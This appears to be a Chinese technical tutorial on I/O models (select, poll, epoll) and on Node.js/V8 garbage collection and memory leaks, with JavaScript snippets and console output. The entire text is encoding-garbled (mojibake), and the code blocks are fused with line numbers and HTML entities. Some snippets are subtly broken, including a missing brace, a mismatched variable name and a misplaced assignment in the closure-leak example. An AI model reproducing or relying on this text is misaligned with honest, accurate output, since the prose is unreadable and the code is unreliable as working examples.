éžé˜»å¡žI/Oï¼šè¿™ç§æ¨¡å¼ä¸‹ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹å‘èµ·ä¸€ä¸ªI/Oæ“ä½œä¹‹åŽï¼Œå¦‚æžœæ•°æ®æ²¡æœ‰å°±ç»ªï¼Œä¼šç«‹åˆ»è¿”å›žï¼ˆæ ‡å¿—æ•°æ®èµ„æºä¸å¯ç”¨ï¼‰ï¼Œæ­¤æ—¶CPUæ—¶é—´ç‰‡å¯ä»¥ç”¨æ¥åšä¸€äº›å…¶ä»–äº‹æƒ…ã€‚ åŒæ­¥ä¸Žå¼‚æ­¥I/OåŒæ­¥ä¸Žå¼‚æ­¥I/Oå‘ç”Ÿåœ¨ä½¿ç”¨èµ„æºé˜¶æ®µã€‚ åŒæ­¥I/Oï¼šåº”ç”¨å‘é€æˆ–æŽ¥å—æ•°æ®åŽï¼Œå¦‚æžœä¸è¿”å›žï¼Œç»§ç»­ç­‰å¾…ï¼ˆæ­¤å¤„å‘ç”Ÿé˜»å¡žï¼‰ï¼Œç›´åˆ°æ•°æ®æˆåŠŸæˆ–å¤±è´¥è¿”å›žã€‚ å¼‚æ­¥I/Oï¼šåº”ç”¨å‘é€æˆ–æŽ¥å—æ•°æ®åŽç«‹åˆ»è¿”å›žï¼Œæ•°æ®å†™å…¥OSç¼“å­˜ï¼Œç”±OSå®Œæˆæ•°æ®å‘é€æˆ–æŽ¥æ”¶ï¼Œå¹¶è¿”å›žæˆåŠŸæˆ–è€…å¤±è´¥çš„ä¿¡æ¯ç»™åº”ç”¨ï¼ŒNodeJså°±æ˜¯å…¸åž‹å¼‚æ­¥ç¼–ç¨‹çš„ä¾‹å­ã€‚ ç”¨æˆ·ç©ºé—´ä¸Žå†…æ ¸ç©ºé—´æ“ä½œç³»ç»Ÿä¸ºäº†å¤šä¸ªåº”ç”¨åŒæ—¶è¿è¡Œï¼Œéœ€è¦ä¿è¯ä¸åŒè¿›ç¨‹ç›¸å¯¹ç‹¬ç«‹ã€å†…æ ¸çš„å®‰å…¨ã€‚æ‰€ä»¥æ“ä½œç³»ç»ŸæŠŠå†…å­˜ç©ºé—´åˆ’åˆ†ä¸ºç”¨æˆ·ç©ºã€å†…æ ¸ç©ºé—´ä¸¤éƒ¨åˆ†ã€‚ç”¨æˆ·ç©ºé—´å­˜æ”¾ç”¨æˆ·ç¨‹åºä»£ç å’Œæ•°æ®ï¼Œè€Œå†…æ ¸ç©ºé—´åˆ™å­˜æ”¾å†…æ ¸ä»£ç å’Œæ•°æ®ã€‚ OSIä¸ƒå±‚æ¨¡åž‹ä¸Žç½‘é™…ç½‘åè®®æ—å›¾ï¼šä¼ è¾“å±‚ä¹‹ä¸Šï¼ˆä¼šè¯å±‚ã€è¡¨ç¤ºå±‚ã€åº”ç”¨å±‚ï¼‰ä¸ºç”¨æˆ·ç©ºé—´ï¼ˆWebå®¢æˆ·ç«¯ã€æµè§ˆå™¨ã€FTPï¼‰ï¼Œä¸‹å››å±‚ï¼ˆä¼ è¾“å±‚ï¼Œç½‘ç»œå±‚ï¼Œæ•°æ®é“¾è·¯å±‚ï¼Œç‰©ç†å±‚ï¼‰ä¸ºå†…æ ¸ç©ºé—´ï¼Œä¾‹å¦‚ä¼ è¾“å±‚çš„TCP/UDPå°±å¯¹åº”å†…æ ¸ç©ºé—´ã€‚ æ“ä½œç³»ç»ŸI/Oæ¨¡åž‹åŒæ­¥é˜»å¡žIOå½“è¿›ç¨‹è°ƒç”¨ recvfrom() å‡½æ•°çš„æ—¶å€™é˜»å¡žï¼Œåº”ç”¨ç¨‹åºå¼€å§‹ç³»ç»Ÿè°ƒç”¨ï¼Œåœ¨ç³»ç»Ÿå†…æ ¸æ•°æ®å°±ç»ªï¼Œå°†æ•°æ®ä»Žå†…æ ¸ä¸­æ‹·è´å‡ºæ¥åŽç»“æŸã€‚è¿™ä¸ªè¿‡ç¨‹åº”ç”¨ç¨‹åºéƒ½å¤„äºŽç­‰å¾…çŠ¶æ€ï¼Œä¸èƒ½åšå…¶ä»–äº‹æƒ…ï¼Œç›´åˆ°å°†æ•°æ®æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´æˆ–å‡ºé”™æ‰è¿”å›žï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºé˜»å¡žI/Oæ¨¡å¼ã€‚ åŒæ­¥éžé˜»å¡žI/Oæƒ³å¯¹äºŽåŒæ­¥éžé˜»å¡žI/Oæ¨¡å¼ï¼ŒåŒæ­¥éžé˜»å¡žI/Oåœ¨ æ¯æ¬¡è°ƒç”¨ä¹‹åŽï¼Œå¦‚æžœæ•°æ®æ²¡æœ‰å°±ç»ªå°±ä¼šç«‹å³è¿”å›žï¼Œä¹‹åŽé‡å¤è°ƒç”¨æ£€æŸ¥I/Oæ“ä½œæ˜¯å¦å°±ç»ªï¼Œè¿™å¯¹CPUèµ„æºéžå¸¸æµªè´¹ï¼Œç›´åˆ°æ•°æ®å°±ç»ªå°†æ•°æ®ä»Žå†…æ ¸æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼Œè¿”å›žæˆåŠŸæŒ‡ç¤ºåˆ°åº”ç”¨ç¨‹åºã€‚ I/Oå¤šè·¯å¤ç”¨é“¾æŽ¥ï¼ˆSocketï¼‰å¹¶å‘å¤§çš„æ—¶å€™ï¼Œä¸Šé¢çš„ä¸¤ç§å°±ä¸é€‚åˆäº†ï¼Œå‰é¢ä¸€ä¸ªå¤„ç†ä¸å®Œï¼ŒåŽé¢çš„å°±åªèƒ½å¹²ç­‰ã€‚å¤šè·¯å¤ç”¨æŠ€æœ¯å…ˆè¿›è¡Œselectæ•°æ®å°±ç»ªåŽï¼Œè°ƒç”¨recvfromè¿›è¡ŒçœŸæ­£çš„I/Oè¯»å†™æ“ä½œã€‚é«˜çº§ä¹‹å¤„åœ¨äºŽèƒ½å¤Ÿä¸€ä¸ªçº¿ç¨‹åŒæ—¶å¤„ç†å¤šä¸ªSocket å¤šè·¯å¤ç”¨ä¸­çš„I/Oé€šå¸¸æŒ‡çš„æ˜¯ç½‘ç»œI/O,å¤šè·¯æŒ‡çš„æ˜¯å¤šä¸ªSockeré“¾æŽ¥ï¼Œå¤ç”¨æŒ‡æ“ä½œç³»ç»Ÿè¿›è¡Œè¿ç®—è°ƒåº¦æœ€å°å•ä½çº¿ç¨‹ï¼Œæ•´ä½“çš„æ„æ€å°±æ˜¯å¤šä¸ªç½‘ç»œI/Oå¤ç”¨ä¸€ä¸ªæˆ–å°‘é‡çº¿ç¨‹æ¥å¤„ç†Socket I/Oå¤šè·¯å¤ç”¨çš„å››ç§å®žçŽ°ï¼šselect/poll/epoll/kqueue selectï¼Œé€šè¿‡è½®è¯¢æ£€æŸ¥åœ¨æ–‡ä»¶æè¿°ç¬¦ä¸Šè®¾ç½®çš„æ ‡å¿—ä½æ¥è¿›è¡Œåˆ¤æ–­ï¼Œselectçš„è½®è¯¢ç›¸å½“äºŽåœ¨æ•°æ®åº“ä¸­æŸ¥æ‰¾ä¸€æ¡è®°å½•æ²¡æœ‰å»ºç«‹ç´¢å¼•ï¼Œå¯¹æ‰€æœ‰çš„socketè¿›è¡Œå…¨éƒ¨éåŽ†ï¼Œè¿™å¯¹CPUæ˜¯æµªè´¹çš„ã€‚å¦å¤–selectè¿˜æœ‰ä¸€ä¸ªé™åˆ¶ï¼Œå¯¹äºŽå•ä¸ªçº¿ç¨‹æ‰€èƒ½æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦æœ€å¤§åªæœ‰1024ï¼Œé‚£ä¹ˆåŸºäºŽselectçš„è½®è¯¢æŠ€æœ¯æœ€å¤šä¹Ÿåªèƒ½å¾ˆå¥½çš„å¤„ç†1000å¹¶å‘çš„åžåé‡ poll,pollå’Œselectåœ¨å®žçŽ°ä¸Šæ²¡æœ‰ä»€ä¹ˆæœ¬è´¨ä¸Šçš„åŒºåˆ«ï¼ŒpollåŸºäºŽé“¾è¡¨æ¥å®žçŽ°ï¼Œæ²¡æœ‰äº†æœ€å¤§é“¾æŽ¥1024çš„é™åˆ¶ã€‚å½“æ–‡ä»¶æè¿°ç¬¦å¤šäº†ä¹‹åŽï¼Œæ¯æ¬¡è°ƒç”¨éƒ½ä¼šå¯¹é“¾æŽ¥è¿›è¡Œçº¿æ€§éåŽ†ï¼Œæ€§èƒ½ä¹Ÿæ˜¯ååˆ†ä½Žä¸‹çš„ã€‚ epollã€‚æ˜¯linuxä¸‹æ•ˆçŽ‡æœ€é«˜çš„I/Oäº‹ä»¶é€šçŸ¥æœºåˆ¶ï¼Œæ²¡æœ‰æœ€å¤§é“¾æŽ¥é™åˆ¶ï¼Œé€šè¿‡callbackå›žè°ƒé€šçŸ¥æœºåˆ¶ï¼Œä¸å†æ˜¯æ¯æ¬¡è°ƒç”¨å¯¹é“¾æŽ¥è¿›è¡Œçº¿æ€§éåŽ†ï¼Œè¿™æ ·å°±ä¸ä¼šéšç€æ–‡ä»¶æè¿°ç¬¦çš„å¢žåŠ å¯¼è‡´æ•ˆçŽ‡ä¸‹é™ã€‚1GBå†…å­˜çš„æœºå™¨ä¸Šå¤§æ¦‚èƒ½ç›‘å¬10wä¸ªç«¯å£ï¼Œè¿œè¶…è¿‡select1024çš„é™åˆ¶ kqueueï¼Œä¸Žepollç±»ä¼¼ï¼Œä»…å­˜äºŽFreeBSD(ä¸€ç§ç±»UNIXæ“ä½œç³»ç»Ÿ) ä¿¡å·é©±åŠ¨IOä»…åœ¨Unixä¸Šæ”¯æŒï¼Œä¸ŽI/Oå¤šè·¯å¤ç”¨ç›¸æ¯”é¿å…äº†selectçš„é˜»å¡žè½®è¯¢ï¼Œåº”ç”¨ç¨‹åºè¿›è¡Œç³»ç»Ÿè°ƒç”¨åŽç«‹å³è¿”å›žï¼Œå¤„ç†å…¶ä»–äº‹æƒ…ï¼Œåœ¨æ•°æ®å°±ç»ªä¹‹åŽç³»ç»Ÿä¼šå‘é€ä¸€ä¸ªSIGIOä¿¡å·åˆ°åº”ç”¨ç¨‹åºï¼Œåº”ç”¨ç¨‹åºå¼€å§‹è¯»å–æ•°æ® å¼‚æ­¥IOæ¨¡åž‹ç›®å‰æœ€ç†æƒ³å½¢å¼çš„ä¸€ç§ï¼Œåº”ç”¨ç¨‹åºå‘èµ·ç³»ç»Ÿè°ƒç”¨åŽæ— éœ€ç­‰å¾…ç›´æŽ¥è¿”å›žå½“å‰è°ƒç”¨çŠ¶æ€ï¼Œè¿›è¡ŒåŽç»­çš„å…¶ä»–ä»»åŠ¡ï¼Œç»“æžœç”±å†…æ ¸å®ŒæˆI/Oæ“ä½œä¹‹åŽé€šè¿‡å›žè°ƒé€šçŸ¥åˆ°åº”ç”¨ç¨‹åºï¼Œä¸­é—´æ²¡æœ‰é˜»å¡žè¿‡ç¨‹ã€‚Linux2.6å¢žåŠ äº†AIOï¼Œä½†æ˜¯å¾ˆå°‘ç³»ç»Ÿèƒ½å¤Ÿå®žçŽ° è½®è¯¢æŠ€æœ¯Select ä¸Ž Epollçš„åŒºåˆ«æ“ä½œæ–¹å¼ä¸Š selecté‡‡ç”¨äº†çº¿æ€§éåŽ†æ¥æŸ¥æ‰¾ï¼Œé“¾æŽ¥å¤šäº†ä¹‹åŽåœ¨ä¸€ä¸ªåºžå¤§çš„æ•°ç»„ä¸­æ¯æ¬¡éåŽ†æ¥é”å®šä¸€ä¸ªé“¾æŽ¥ï¼Œéžå¸¸æ¶ˆè€—æ€§èƒ½ epollåˆ™ä¸éœ€è¦éåŽ†ï¼Œé‡‡ç”¨çš„æ˜¯å›žè°ƒæœºåˆ¶ï¼Œå¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªHashTableï¼Œæ¥é”å®šä¸€ä¸ªå¯¹è±¡éžå¸¸å¿«ã€‚ æ–‡ä»¶æè¿°ç¬¦é™åˆ¶ å¯¹äºŽæ–‡ä»¶æè¿°ç¬¦æœ€å¤§é“¾æŽ¥æ•°selecté™åˆ¶ä¸º1024 epollåˆ™æ²¡æœ‰è¿™ä¸ªé™åˆ¶ï¼Œé€šå¸¸åœ¨1GBå†…å­˜çš„æœºå™¨ä¸Šæ‰€èƒ½æ”¯æŒçš„è¿žæŽ¥æ•°ä¸º10Wå·¦å³ã€‚ æ“ä½œç³»ç»Ÿçš„æ”¯æŒ ç›®å‰é«˜æ€§èƒ½çš„WebæœåŠ¡å™¨Nginxæ˜¯åŸºäºŽepollæ¥å®žçŽ°é«˜å¹¶å‘çš„ Nodejsä¸­çš„å†…å­˜ç®¡ç†å’ŒV8åžƒåœ¾å›žæ”¶æœºåˆ¶åœ¨Nodejsä¸­ï¼Œå…³äºŽåžƒåœ¾å›žæ”¶ã€å†…å­˜é‡Šæ”¾ä¸éœ€è¦åƒCè¯­è¨€åˆ›å»ºä¸€ä¸ªå¯¹è±¡ä¹‹åŽéœ€æ‰‹åŠ¨åˆ›å»ºä¸€ä¸ªdelete/freeçš„ä¸€ä¸ªæ“ä½œä¹‹åŽè¿›è¡ŒGC,Nodejsä¸Žjavaä¸€æ ·ï¼Œç”±è™šæ‹Ÿæœºè¿›è¡Œå†…å­˜è‡ªåŠ¨ç®¡ç†ã€‚ NodeJsä¸­çš„GCnode.jsæ˜¯åŸºäºŽChrome v8å¼•æ“Žçš„javascriptè¿è¡ŒçŽ¯å¢ƒï¼ŒV8å°±æ˜¯è™šæ‹Ÿæœºã€‚ åžƒåœ¾å›žæ”¶å†…å­˜ç®¡ç†å®žè·µå†…å­˜æ³„éœ²nodeæä¾›process.memoryUsageæ–¹æ³•æ¥æŸ¥çœ‹å½“å‰è¿›ç¨‹å†…å­˜ä½¿ç”¨æƒ…å†µï¼Œå•ä½ä¸ºèŠ‚ ress(resident set size)ï¼šRAMä¸­ä¿å­˜çš„è¿›ç¨‹å ç”¨çš„å†…å­˜éƒ¨åˆ†ï¼ŒåŒ…æ‹¬ä»£ç æœ¬èº«ã€æ ˆã€å † heapTotalï¼šå †ä¸­æ€»å…±ç”³è¯·åˆ°çš„å†…å­˜é‡ heapUsedï¼šå †ä¸­ç›®å‰ç”¨åˆ°çš„å†…å­˜é‡ï¼Œåˆ¤æ–­å†…å­˜æ³„éœ²ä¸»è¦ä»¥è¿™ä¸ªå­—èŠ‚ä¸ºå‡† externalï¼šV8å¼•æ“Žå†…å­˜C++å¯¹è±¡å ç”¨çš„å†…å­˜ 1234567891011121314151617181920212223/***å•ä½å­—èŠ‚æ ¼å¼ä¸ºMBè¾“å‡º*/const format = function(bytes) return (bytes/1024/1024).toFixed(2)+' MB'&#125;/**å°è£…printæ–¹æ³•è¾“å‡ºå†…å­˜å ç”¨ä¿¡æ¯*/const print = function()&#123; const memoryUsage = process.memoryUsage(); console.log( JSON.stringify(&#123; res:format(memoryUsage.rss), heapTotal:format(memoryUsage.heapTotal), heapUsed:format(memoryUsage.heapUsed), external:format(memoryUsage.external), &#125;) )&#125; å†…å­˜æ³„éœ²çš„ä¾‹å­å †ç”¨æ¥å­˜æ”¾å¯¹è±¡å¼•ç”¨ç±»åž‹ï¼Œä¾‹å¦‚å­—ç¬¦ä¸²ã€å¯¹è±¡ã€åœ¨ä»£ç ä¸­åˆ›å»ºä¸€ä¸ªFruitå­˜æ”¾åœ¨å †ä¸­ 12345678910111213141516171819// example.jsfunction Quantity(num)&#123; if(num)&#123; return new Array(num * 1024 * 1024) &#125; return num;&#125;function Fruit(name,quantity)&#123; this.name = name; this.quantity = new Quantity(quantity);&#125;let apple = new Fruit('apple');print();let banane = new Fruit('banane',20);print();// æ‰§è¡Œä»£ç ï¼Œaplleå¯¹è±¡heapUsedä½¿ç”¨ä»…æœ‰4.21Mï¼Œè€Œbananaç”±äºŽquantityå±žæ€§åˆ›å»ºäº†ä¸€ä¸ªå¾ˆå¤§æ•°ç»„ç©ºé—´å¯¼è‡´heapUsedé£™å‡åˆ°164.21Mã€‚// &#123;"rss":"19.94 MB","heapTotal":"6.83 MB","heapUsed":"4.21 MB","external":"0.01 MB"&#125;// &#123;"rss":"180.04 MB","heapTotal":"166.84 MB","heapUsed":"164.24 MB","external":"0.01 MB"&#125; æ‰‹åŠ¨æ‰§è¡Œåžƒåœ¾å›žæ”¶å†…å­˜é‡Šæ”¾123456banana = null;global.gc();print(); // æ‰§è¡Œ node --expose-gc xxx.js --expose-gcå‚æ•°è¡¨ç¤ºè¿è¡Œæ‰‹åŠ¨æ‰§è¡Œåžƒåœ¾å›žæ”¶æœºåˆ¶ï¼Œå°†bananaå¯¹è±¡èµ‹å€¼nullè¿›è¡ŒGC// &#123;"rss":"52.48 MB","heapTotal":"9.33 MB","heapUsed":"3.97 MB","external":"0.01 MB"&#125;// heapUsedçš„ä½¿ç”¨å·²ç»é™äº†ä¸‹æ¥ V8åžƒåœ¾å›žæ”¶æœºåˆ¶åžƒåœ¾å›žæ”¶æŒ‡çš„æ˜¯å›žæ”¶é‚£äº›åœ¨åº”ç”¨ç¨‹åºä¸­ä¸å†å¼•ç”¨çš„å¯¹è±¡ï¼Œå½“ä¸€ä¸ªå¯¹è±¡æ— æ³•ä»Žæ ¹èŠ‚ç‚¹è®¿é—®è¿™ä¸ªå¯¹è±¡å°±ä¼šä½œä¸ºåžƒåœ¾å›žæ”¶çš„å€™é€‰å¯¹è±¡ã€‚è¿™é‡Œçš„æ ¹å¯¹è±¡å¯ä»¥ä¸ºå…¨å±€å¯¹è±¡ã€å±€éƒ¨å˜é‡ï¼Œæ— æ³•ä»Žæ ¹èŠ‚ç‚¹è®¿é—®æŒ‡çš„ä¹Ÿå°±æ˜¯ä¸ä¼šå†è¢«å…¶ä»–æ´»åŠ¨å¯¹è±¡æ‰€å¼•ç”¨ã€‚ V8å †å†…å­˜é™åˆ¶åœ¨V8ä¸­é™åˆ¶64ä½æœºåˆ¶å¤§çº¦ä¸º1.4Gï¼Œ32ä½çš„å¤§æ¦‚æ˜¯0.7Gï¼Œå¯¹äºŽä¸€äº›å¤§å†…å­˜çš„æ“ä½œéœ€è¦è°¨æ…Žå¦åˆ™è¶…å‡ºV8å†…å­˜é™åˆ¶ä¼šé€ æˆè¿›ç¨‹é€€å‡º å†…å­˜æº¢å‡ºè¾¹ç•Œçš„ä¾‹å­ï¼š 123456789101112131415161718// overflow.jsconst format = function(bytes)&#123; return (bytes / 1024 / 1024).toFixed(2)+' MB';&#125;const print = function()&#123; const memoryUsage = process.memoryUsage(); console.log( `heapTotal:$&#123;format(memoryUsage.heapTotal)&#125;, heapUsed: $&#123;format(memoryUsage.heapUsed)&#125;` )&#125;const total = [];setInterval(()=&gt;&#123; total.push(new Array(20*1024*1024)) // å¤§å†…å­˜å ç”¨ print();&#125;,1000) totalä¸ºå…¨å±€å˜é‡æ¯æ¬¡å¢žé•¿å¤§æ¦‚åœ¨160Må·¦å³ä¸”ä¸ä¼šè¢«å›žæ”¶ï¼Œåœ¨æŽ¥è¿‘V8è¾¹ç•Œæ—¶æ— æ³•åˆ†é…å†…å­˜å¯¼è‡´è¿›ç¨‹å†…å­˜æº¢å‡º 123456789101112131415161718$ node overflow.jsheapTotal: 166.84 MB, heapUsed: 164.23 MBheapTotal: 326.85 MB, heapUsed: 324.26 MBheapTotal: 487.36 MB, heapUsed: 484.27 MBheapTotal: 649.38 MB, heapUsed: 643.98 MBheapTotal: 809.39 MB, heapUsed: 803.98 MBheapTotal: 969.40 MB, heapUsed: 963.98 MBheapTotal: 1129.41 MB, heapUsed: 1123.96 MBheapTotal: 1289.42 MB, heapUsed: 1283.96 MB&lt;--- Last few GCs ---&gt;[87581:0x103800000] 11257 ms: Mark-sweep 1283.9 (1290.9) -&gt; 1283.9 (1290.9) MB, 512.1 / 0.0 ms allocation failure GC in old space requested[87581:0x103800000] 11768 ms: Mark-sweep 1283.9 (1290.9) -&gt; 1283.9 (1287.9) MB, 510.7 / 0.0 ms last resort GC in old space requested[87581:0x103800000] 12263 ms: Mark-sweep 1283.9 (1287.9) -&gt; 1283.9 (1287.9) MB, 495.3 / 0.0 ms last resort GC in old space requested&lt;--- JS stacktrace ---&gt; v8æä¾›äº†ä¸¤ä¸ªå‚æ•°ä»…åœ¨å¯ç”¨é˜¶æ®µè°ƒæ•´å†…å­˜é™åˆ¶å¤§å°ï¼Œåˆ†åˆ«ä¸ºè°ƒæ•´è€ç”Ÿä»£ã€æ–°ç”Ÿä»£ï¼š â€“max-old-space-size=2048 â€“max-new-space-size=2048 å†…å­˜ä¸æ˜¯è¶Šå¤§è¶Šå¥½ï¼Œä¸€æ–¹é¢æ˜¯æœåŠ¡å™¨èµ„æºæ˜‚è´µï¼Œå¦å¤–æ˜¯V8ä»¥1.5Gçš„å †å†…å­˜è¿›è¡Œä¸€æ¬¡å°çš„åžƒåœ¾å›žæ”¶å¤§çº¦éœ€è¦50æ¯«ç§’ä»¥ä¸Šæ—¶é—´ï¼Œä¼šå¯¼è‡´JavaScriptè¿›ç¨‹æš‚åœï¼Œè¿™ä¹Ÿæ˜¯æœ€ä¸»è¦çš„ä¸€æ–¹é¢ã€‚ æ–°ç”Ÿä»£ä¸Žè€ç”Ÿä»£æ–°ç”Ÿä»£ç©ºé—´ ç”±äºŽæ–°ç©ºé—´çš„åžƒåœ¾å›žæ”¶æœºåˆ¶å¾ˆé¢‘ç¹ï¼Œæ‰€ä»¥å¤„ç†æ–¹å¼å¿…é¡»éžå¸¸å¿«ï¼Œé‡‡ç”¨Scavengeç®—æ³•ï¼Œè¿™æ˜¯ä¸€ç§å¤åˆ¶ç®—æ³•ï¼Œæ–°ç”Ÿä»£ç©ºé—´ä¼šè¢«ä¸€åˆ†ä¸ºäºŒåˆ’åˆ†ä¸ºä¸¤ä¸ªç›¸ç­‰å¤§å°çš„from-spaceå’Œto-spaceå·¥ä½œæ–¹å¼æ˜¯å°†from spaceä¸­å­˜æ´»çš„å¯¹è±¡å¤åˆ¶å‡ºæ¥ï¼Œç„¶åŽç§»åŠ¨å®ƒä»¬åˆ°to space ä¸­æˆ–è€…è¢«æå‡åˆ°è€ç”Ÿä»£ç©ºé—´ä¸­ï¼Œå¯¹äºŽfrom spaceä¸­æ²¡æœ‰å­˜æ´»çš„å¯¹è±¡å°†ä¼šè¢«é‡Šæ”¾ï¼Œå®Œæˆè¿™äº›å¤åˆ¶åŽå†å°†from spaceå’Œto spaceè¿›è¡Œäº’æ¢ã€‚ Scavengeç®—æ³•é€‚ç”¨å°‘é‡å†…å­˜çš„åžƒåœ¾å›žæ”¶ï¼Œä½†æ˜¯æœ‰å¾ˆå¤§çš„ç©ºé—´å¼€é”€ï¼Œå¯¹äºŽæ–°ç”Ÿä»£å°‘é‡å†…å­˜æ˜¯å¯ä»¥æŽ¥å—çš„ è€ç”Ÿä»£ç©ºé—´ æ–°ç”Ÿä»£ç©ºé—´åœ¨åžƒåœ¾å›žæ”¶æ»¡è¶³äºŽä¸€å®šçš„æ¡ä»¶ï¼ˆæ˜¯å¦ç»è¿‡Scavengeç©ºé—´ã€to spaceå†…å­˜å æ¯”ï¼‰ä¼šè¢«æ™‹å‡åˆ°è€ç”Ÿä»£ç©ºé—´ä¸­ï¼Œåœ¨è€ç”Ÿä»£ç©ºé—´ä¸­çš„å¯¹è±¡éƒ½å·²ç»è‡³å°‘ç»åŽ†äº†ä¸€æ¬¡æˆ–è€…å¤šæ¬¡çš„å›žæ”¶æ‰€ä»¥å®ƒä»¬çš„å­˜æ´»æ¦‚çŽ‡ä¼šæ›´å¤§ã€‚åœ¨ä½¿ç”¨Scavengeç®—æ³•ä¼šæœ‰ä¸¤ä¸ªç¼ºç‚¹ï¼Œä¸€æ˜¯å°†ä¼šé‡å¤çš„å¤åˆ¶å­˜æ´»å¯¹è±¡ä½¿å¾—æ•ˆçŽ‡ä½Žä¸‹ï¼ŒäºŒæ˜¯å¯¹ç©ºé—´èµ„æºçš„æµªè´¹ï¼Œæ‰€ä»¥åœ¨è€ç”Ÿä»£ç©ºé—´ä¸­é‡‡ç”¨äº† Mark-Sweepï¼ˆæ ‡è®°æ¸…é™¤ï¼‰å’ŒMark-Compactï¼ˆæ ‡è®°æ•´ç†ï¼‰ç®—æ³• Mark-Sweepå¤„ç†æ—¶åˆ†ä¸ºæ ‡è®°ã€æ¸…é™¤ä¸¤ä¸ªæ­¥éª¤ï¼Œä¸ŽScavengeç®—æ³•åªå¤åˆ¶æ´»å¯¹è±¡ç›¸åçš„æ˜¯åœ¨è€ç”Ÿä»£ç©ºé—´ä¸­ç”±äºŽæ´»å¯¹è±¡å å¤šæ•°Mark-Sweepåœ¨æ ‡è®°é˜¶æ®µéåŽ†å †ä¸­çš„æ‰€æœ‰å¯¹è±¡ä»…æ ‡è®°æ´»å¯¹è±¡æŠŠæœªæ ‡è®°çš„æ­»å¯¹è±¡æ¸…é™¤ï¼Œè¿™æ—¶ä¸€æ¬¡æ ‡è®°æ¸…é™¤å°±å·²ç»å®Œæˆäº†ã€‚æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯è¢«æ¸…é™¤çš„å¯¹è±¡éå¸ƒäºŽå„å†…å­˜åœ°å€ï¼Œäº§ç”Ÿå¾ˆå¤šå†…å­˜ç¢Žç‰‡ Mark-Compact(æ ‡è®°æ•´ç†ç®—æ³•)ä¸ºäº†è§£å†³å†…å­˜ç¢Žç‰‡é—®é¢˜ï¼Œåœ¨å…¶å·¥ä½œè¿‡ç¨‹ä¸­å°†æ´»ç€çš„å¯¹è±¡å¾€ä¸€ç«¯ç§»åŠ¨ï¼Œè¿™æ—¶å†…å­˜ç©ºé—´æ˜¯ç´§å‡‘çš„ï¼Œç§»åŠ¨å®Œæˆä¹‹åŽï¼Œç›´æŽ¥æ•´ç†è¾¹ç•Œä¹‹å¤–çš„å†…å­˜ã€‚ å°ç»“V8ä½¿ç”¨äº†ä¸åŒçš„åžƒåœ¾å›žæ”¶ç®—æ³•Scavenge/Mark-Sweep/Mark-Compact.è¿™ä¸‰ç§åžƒåœ¾å›žæ”¶ç®—æ³•éƒ½é¿å…ä¸äº†åœ¨è¿›è¡Œåžƒåœ¾å›žæ”¶æ—¶éœ€è¦å°†åº”ç”¨ç¨‹åºæš‚åœï¼Œå¾…åžƒåœ¾å›žæ”¶å®Œæˆä¹‹åŽåœ¨æ¢å¤åº”ç”¨é€»è¾‘ï¼Œå¯¹äºŽæ–°ç”Ÿä»£ç©ºé—´æ¥è¯´ç”±äºŽå¾ˆå¿«æ‰€ä»¥å½±å“ä¸å¤§ï¼Œä½†æ˜¯å¯¹äºŽè€ç”Ÿä»£ç©ºé—´ç”±äºŽå­˜æ´»å¯¹è±¡è¾ƒå¤šï¼Œåœé¡¿è¿˜æ˜¯ä¼šé€ æˆå½±å“çš„ï¼Œå› æ­¤V8åˆæ–°å¢žäº†å¢žé‡æ ‡è®°çš„æ–¹å¼å‡å°‘åœé¡¿æ—¶é—´ã€‚ å†…å­˜æ³„éœ²å†…å­˜æ³„éœ²ï¼ˆMemory Leakï¼‰æ˜¯æŒ‡ç¨‹åºä¸­å·²åŠ¨æ€åˆ†é…çš„å †å†…å­˜ç”±äºŽæŸç§åŽŸå› ç¨‹åºæœªé‡Šæ”¾æˆ–æ— æ³•é‡Šæ”¾ï¼Œé€ æˆç³»ç»Ÿå†…å­˜çš„æµªè´¹ï¼Œå¯¼è‡´ç¨‹åºè¿è¡Œé€Ÿåº¦å‡æ…¢ç”šè‡³ç³»ç»Ÿå¥”æºƒç­‰ä¸¥é‡åŽæžœã€‚ å…¨å±€å˜é‡ï¼Œæœªå£°æ˜Žçš„å˜é‡æˆ–æŒ‚åœ¨å…¨å±€globalä¸‹çš„å˜é‡ä¸ä¼šè‡ªåŠ¨å›žæ”¶ï¼Œå°†ä¼šå¸¸é©»å†…å­˜ç›´åˆ°ç›´åˆ°è¿›ç¨‹é€€å‡ºæ‰ä¼šé‡Šæ”¾ï¼Œé™¤éžé€šè¿‡deleteæˆ–è€…é‡æ–°èµ‹å€¼ä¸ºundefined/nullè§£å†³ä¹‹é—´çš„å¼•ç”¨å…³ç³»ï¼Œæ‰ä¼šè¢«å›žæ”¶ã€‚ é—­åŒ…ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå¸¸è§çš„å†…å­˜æ³„éœ²é—®é¢˜ï¼Œé—­åŒ…ä¼šå¼•ç”¨çˆ¶çº§å‡½æ•°ä¸­çš„å˜é‡ï¼Œå¦‚æžœé—­åŒ…å¾—ä¸åˆ°é‡Šæ”¾ï¼Œé—­åŒ…å¼•ç”¨çš„çˆ¶çº§å˜é‡ä¹Ÿä¸ä¼šé‡Šæ”¾ä»Žè€Œå¯¼è‡´å†…å­˜æ³„éœ² ä¾‹å¦‚ï¼š 12345678910111213141516var theThing = null;var replaceThing = function()&#123; var originalThing = theThing; var unused = function()&#123; if(originalThing)&#123; console.log('hi') &#125; theThing = &#123; longStr:new Array(1000000).join('*'), someMethod:function()&#123; console.log(someMessage) &#125; &#125; &#125;&#125;setInterval(replaceThing,1000) ä»£ç è¿è¡Œæ—¶ï¼Œæ¯æ¬¡æ‰§è¡ŒreplaceThingæ–¹æ³•éƒ½ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œä½†æ˜¯ä¹‹å‰çš„å¯¹è±¡æ²¡æœ‰é‡Šæ”¾å¯¼è‡´çš„å†…å­˜æ³„éœ²ã€‚ æ…Žå°†å†…å­˜ä½œä¸ºç¼“å­˜ 